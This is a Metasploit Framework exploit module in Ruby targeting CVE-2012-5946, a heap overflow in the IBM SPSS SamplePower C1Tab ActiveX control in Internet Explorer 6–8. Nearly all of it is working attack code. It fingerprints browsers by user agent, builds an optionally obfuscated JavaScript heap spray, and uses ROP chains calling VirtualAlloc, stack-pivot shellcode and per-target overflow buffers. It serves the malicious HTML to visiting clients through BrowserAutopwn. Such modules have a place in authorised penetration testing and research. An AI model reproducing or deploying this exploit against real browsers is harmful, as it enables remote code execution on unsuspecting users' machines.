##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::RopDb
  include Msf::Exploit::Remote::BrowserAutopwn

  autopwn_info({
    :ua_name    => HttpClients::IE,
    :ua_minver  => "6.0",
    :ua_maxver  => "8.0",
    :javascript => true,
    :os_name    => OperatingSystems::WINDOWS,
    :rank       => NormalRanking,
    :classid    => "{24E04EBF-014D-471F-930E-7654B1193BA9}",
    :method     => "TabCaption"
  })


  def initialize(info={})
    super(update_info(info,
      'Name'           => "IBM SPSS SamplePower C1Tab ActiveX Heap Overflow",
      'Description'    => %q{
          This module exploits a heap based buffer overflow in the C1Tab ActiveX control,
        while handling the TabCaption property. The affected control can be found in the
        c1sizer.ocx component as included with IBM SPSS SamplePower 3.0. This module has
        been tested successfully on IE 6, 7 and 8 on Windows XP SP3 and IE 8 on Windows 7
        SP1.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Alexander Gavrun', # Vulnerability discovery
          'juan vazquez' # Metasploit
        ],
      'References'     =>
        [
          [ 'CVE', '2012-5946' ],
          [ 'OSVDB', '92845' ],
          [ 'BID', '59559' ],
          [ 'URL', 'http://www-01.ibm.com/support/docview.wss?uid=swg21635476' ]
        ],
      'Payload'        =>
        {
          'Space' => 991,
          'BadChars' => "\x00",
          'DisableNops' => true
        },
      'DefaultOptions'  =>
        {
          'InitialAutoRunScript' => 'migrate -f'
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          # IBM SPSS SamplePower 3.0 / c1sizer.ocx 8.0.20071.39
          [ 'Automatic', {} ],
          [ 'IE 6 on Windows XP SP3',
            {
              'Offset' => '0x5F4',
              'Ret' => 0x0c0c0c08
            }
          ],
          [ 'IE 7 on Windows XP SP3',
            {
              'Offset' => '0x5F4',
              'Ret' => 0x0c0c0c08
            }
          ],
          [ 'IE 8 on Windows XP SP3',
            {
              'Offset' => '0x5f4',
              'Ret' => 0x0c0c0c0c,
              'Pivot' => 0x7c342643 # xchg eax, esp # pop edi # add byte ptr [eax],al # pop ecx # ret
            }
          ],
          [ 'IE 8 on Windows 7',
            {
              'Offset' => '0x5f4',
              'Ret' => 0x0c0c0c0c,
              'Pivot' => 0x7c342643 # xchg eax, esp # pop edi # add byte ptr [eax],al # pop ecx # ret
            }
          ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Apr 26 2013",
      'DefaultTarget'  => 0))

    register_options(
      [
        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])
      ], self.class)

  end

  def get_target(agent)
    #If the user is already specified by the user, we'll just use that
    return target if target.name != 'Automatic'

    nt = agent.scan(/Windows NT (\d\.\d)/).flatten[0] || ''
    ie = agent.scan(/MSIE (\d)/).flatten[0] || ''

    ie_name = "IE #{ie}"

    case nt
    when '5.1'
      os_name = 'Windows XP SP3'
    when '6.0'
      os_name = 'Windows Vista'
    when '6.1'
      os_name = 'Windows 7'
    end

    targets.each do |t|
      if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))
        print_status("Target selected as: #{t.name}")
        return t
      end
    end
    print_status("target not found #{agent}")
    return nil
  end

  def ie_heap_spray(my_target, p)
    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))
    js_nops = Rex::Text.to_unescape("\x0c"*4, Rex::Arch.endian(target.arch))

    # Land the payload at 0x0c0c0c0c
    # For IE 6, 7, 8
    js = %Q|
    var heap_obj = new heapLib.ie(0x20000);
    var code = unescape("#{js_code}");
    var nops = unescape("#{js_nops}");
    while (nops.length < 0x80000) nops += nops;
    var offset = nops.substring(0, #{my_target['Offset']});
    var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);
    while (shellcode.length < 0x40000) shellcode += shellcode;
    var block = shellcode.substring(0, (0x80000-6)/2);
    heap_obj.gc();
    for (var i=1; i < 0x300; i++) {
      heap_obj.alloc(block);
    }
    var overflow = nops.substring(0, 10);
    |

    js = heaplib(js, {:noobfu => true})

    if datastore['OBFUSCATE']
      js = ::Rex::Exploitation::JSObfu.new(js)
      js.obfuscate
    end

    return js
  end

  def junk(n=4)
    return rand_text_alpha(n).unpack("V").first
  end

  def rop_chain
    # gadgets from c1sizer.ocx
    rop_gadgets =
      [
        0x0c0c0c10,
        0x10026984, # ADD ESP,10 # POP EDI # POP ESI # POP EBX # POP EBP # RETN # stackpivot to the controlled stack
        0x100076f1, # pop eax # ret
        0x10029134, # &VirtualAllox
        0x1001b41e, # jmp [eax]
        0x0c0c0c34, # ret address
        0x0c0c0c0c,  # lpAddress
        0x00001000, # dwSize
        0x00001000, # flAllocationType
        0x00000040  # flProtect
      ].pack("V*")

    return rop_gadgets
  end

  def get_payload(t, cli)
    code = payload.encoded
    # No rop. Just return the payload.

    if (t.name =~ /IE 6/ or t.name =~ /IE 7/)
      fake_memory = [
        0x0c0c0c10,
        0x0c0c0c14
      ].pack("V*")
      return fake_memory + code
    end

    return rop_chain + stack_pivot + code
  end

  # Objects filling aren't randomized because
  # this combination make exploit more reliable.
  def fake_object(size)
    object = "B" * 8     # metadata
    object << "D" * size # fake object
    return object
  end

  def stack_pivot
    pivot = "\x64\xa1\x18\x00\x00\x00"  # mov eax, fs:[0x18 # get teb
    pivot << "\x83\xC0\x08"             # add eax, byte 8 # get pointer to stacklimit
    pivot << "\x8b\x20"                 # mov esp, [eax] # put esp at stacklimit
    pivot << "\x81\xC4\x30\xF8\xFF\xFF" # add esp, -2000 # plus a little offset
    return pivot
  end

  # Check the memory layout documentation at the end of the module
  def overflow_xp
    buf = rand_text_alpha(0x10000)
    # Start to overflow
    buf << fake_object(0x40)
    buf << fake_object(0x30)
    buf << fake_object(0x30)
    buf << fake_object(0x40)
    buf << fake_object(0x10)
    buf << fake_object(0x10)
    buf << fake_object(0x20)
    buf << fake_object(0x10)
    buf << fake_object(0x30)
    buf << "B" * 0x8     # metadata chunk
    buf << "\x0c" * 0x40 # Overflow first 0x40 of the exploited object
  end

  # Check the memory layout documentation at the end of the module
  def overflow_xp_ie8
    buf = [
      junk,       # padding
      0x1001b557, # pop eax # c1sizer.ocx
      0x0c0c0c14, # eax
      0x10028ad8  # xchg eax,esp # c1sizer.ocx # stackpivot to the heap
    ].pack("V*")
    buf << rand_text_alpha(0x10000-16)
    # Start to overflow
    buf << "B" * 0x8     # metadata chunk
    buf << "\x0c" * 0x40 # Overflow first 0x40 of the exploited object
  end

  # Check the memory layout documentation at the end of the module
  def overflow_w7
    buf = [
      junk,       # padding
      0x1001b557, # pop eax # c1sizer.ocx
      0x0c0c0c14, # eax
      0x10028ad8  # xchg eax,esp # c1sizer.ocx # stackpivot to the heap
    ].pack("V*")
    buf << rand_text_alpha(0x10000-16)
    # Start to oveflow
    buf << fake_object(0x3f8)
    buf << fake_object(0x1a0)
    buf << fake_object(0x1e0)
    buf << fake_object(0x1a0)
    buf << fake_object(0x1e0)
    buf << fake_object(0x1a0)
    buf << "B" * 0x8     # metadata chunk
    buf << "\x0c" * 0x40 # Overflow first 0x40 of the exploited object
  end

  def get_overflow(t)
    if t.name =~ /Windows 7/
      return overflow_w7
    elsif t.name =~ /Windows XP/ and t.name =~ /IE 8/
      return overflow_xp_ie8
    elsif t.name =~ /Windows XP/
      return overflow_xp
    end
  end

  # * 15 C1TAB objects are used to defragement the heap, so objects are stored after the vulnerable buffer.
  # * Based on empirical tests, 5th C1TAB comes after the vulnerable buffer.
  # * Using the 7th CITAB is possible to overflow itself and get control before finishing the set of the
  # TabCaption property.
  def trigger_w7
    target = rand_text_alpha(5 + rand(3))
    target2 = rand_text_alpha(5 + rand(3))
    target3 = rand_text_alpha(5 + rand(3))
    target4 = rand_text_alpha(5 + rand(3))
    target5 = rand_text_alpha(5 + rand(3))
    target6 = rand_text_alpha(5 + rand(3))
    target7 = rand_text_alpha(5 + rand(3))
    target8 = rand_text_alpha(5 + rand(3))
    target9 = rand_text_alpha(5 + rand(3))
    target10 = rand_text_alpha(5 + rand(3))
    target11 = rand_text_alpha(5 + rand(3))
    target12 = rand_text_alpha(5 + rand(3))
    target13 = rand_text_alpha(5 + rand(3))
    target14 = rand_text_alpha(5 + rand(3))
    target15 = rand_text_alpha(5 + rand(3))

    objects = %Q|
    <object id="#{target}" width="100%" height="100%" classid="clsid:24E04EBF-014D-471F-930E-7654B1193BA9"></object>
    <object id="#{target2}" width="100%" height="100%" classid="clsid:24E04EBF-014D-471F-930E-7654B1193BA9"></object>
    <object id="#{target3}" width="100%" height="100%" classid="clsid:24E04EBF-014D-471F-930E-7654B1193BA9"></object>
    <object id="#{target4}" width="100%" height="100%" classid="clsid:24E04EBF-014D-471F-930E-7654B1193BA9"></object>
    <object id="#{target5}" width="100%" height="100%" classid="clsid:24E04EBF-014D-471F-930E-7654B1193BA9"></object>
    <object id="#{target6}" width="100%" height="100%" classid="clsid:24E04EBF-014D-471F-930E-7654B1193BA9"></object>
    <object id="#{target7}" width="100%" height="100%" classid="clsid:24E04EBF-014D-471F-930E-7654B1193BA9"></object>
    <object id="#{target8}" width="100%" height="100%" classid="clsid:24E04EBF-014D-471F-930E-7654B1193BA9"></object>
    <object id="#{target9}" width="100%" height="100%" classid="clsid:24E04EBF-014D-471F-930E-7654B1193BA9"></object>
    <object id="#{target10}" width="100%" height="100%" classid="clsid:24E04EBF-014D-471F-930E-7654B1193BA9"></object>
    <object id="#{target11}" width="100%" height="100%" classid="clsid:24E04EBF-014D-471F-930E-7654B1193BA9"></object>
    <object id="#{target12}" width="100%" height="100%" classid="clsid:24E04EBF-014D-471F-930E-7654B1193BA9"></object>
    <object id="#{target13}" width="100%" height="100%" classid="clsid:24E04EBF-014D-471F-930E-7654B1193BA9"></object>
    <object id="#{target14}" width="100%" height="100%" classid="clsid:24E04EBF-014D-471F-930E-7654B1193BA9"></object>
    <object id="#{target15}" width="100%" height="100%" classid="clsid:24E04EBF-014D-471F-930E-7654B1193BA9"></object>
    |
    return objects, target7
  end

  # * Based on empirical test, the C1TAB object comes after the vulnerable buffer on memory, so just
  # an object is sufficient to overflow itself and get control execution.
  def trigger_xp
    target = rand_text_alpha(5 + rand(3))

    objects = %Q|
    <object id="#{target}" width="100%" height="100%" classid="clsid:24E04EBF-014D-471F-930E-7654B1193BA9"></object>
    |
    return objects, target
  end

  def get_trigger(t)
    if t.name =~ /Windows 7/
      return trigger_w7
    elsif t.name =~ /Windows XP/
      return trigger_xp
    end
  end

  def load_exploit_html(my_target, cli)
    p  = get_payload(my_target, cli)
    js = ie_heap_spray(my_target, p)
    buf = get_overflow(my_target)

    objects, target_object = get_trigger(my_target)

    html = %Q|
    <html>
    <head>
    </head>
    <body>
    #{objects}
    <script>
    CollectGarbage();
    #{js}
    #{target_object}.Caption = "";
    #{target_object}.TabCaption(0) = "#{buf}";
    </script>
    </body>
    </html>
    |

    return html
  end

  def on_request_uri(cli, request)
    agent = request.headers['User-Agent']
    uri   = request.uri
    print_status("Requesting: #{uri}")

    my_target = get_target(agent)
    # Avoid the attack if no suitable target found
    if my_target.nil?
      print_error("Browser not supported, sending 404: #{agent}")
      send_not_found(cli)
      return
    end

    html = load_exploit_html(my_target, cli)
    html = html.gsub(/^\t\t/, '')
    print_status("Sending HTML...")
    send_response(cli, html, {'Content-Type'=>'text/html'})
  end

end
